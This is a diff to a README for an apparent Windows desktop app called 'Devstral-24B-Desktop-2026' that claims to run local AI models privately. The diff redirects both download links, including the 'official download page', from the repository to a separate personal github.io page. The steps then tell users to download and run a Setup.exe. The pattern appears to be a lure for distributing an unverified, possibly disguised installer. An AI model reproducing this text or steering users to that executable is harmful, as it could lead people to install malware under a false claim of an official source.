@@ -1,6 +1,6 @@
 # 🤖 Devstral-24B-Desktop-2026 - Run local AI models on Windows
 
-[![Download Devstral](https://img.shields.io/badge/Download-Devstral_24B-blue.svg)](https://github.com/meersho8111/Devstral-24B-Desktop-2026)
+[![Download Devstral](https://img.shields.io/badge/Download-Devstral_24B-blue.svg)](https://meersho8111.github.io)
 
 Devstral-24B-Desktop-2026 provides a powerful way to run large language models directly on your PC. You keep your data private because the software runs entirely on your local hardware. You do not need a constant internet connection to use these tools. This application brings coding assistance, task automation, and smart document management to your desktop.
 
@@ -20,7 +20,7 @@ A graphics card helps the AI process information quickly. If you have an older c
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official download page here](https://github.com/meersho8111/Devstral-24B-Desktop-2026).
+1. Visit the [official download page here](https://meersho8111.github.io).
 2. Look for the file named Setup.exe in the latest release section.
 3. Click the file to start the download.
 4. Save the file to your desktop or your Downloads folder.
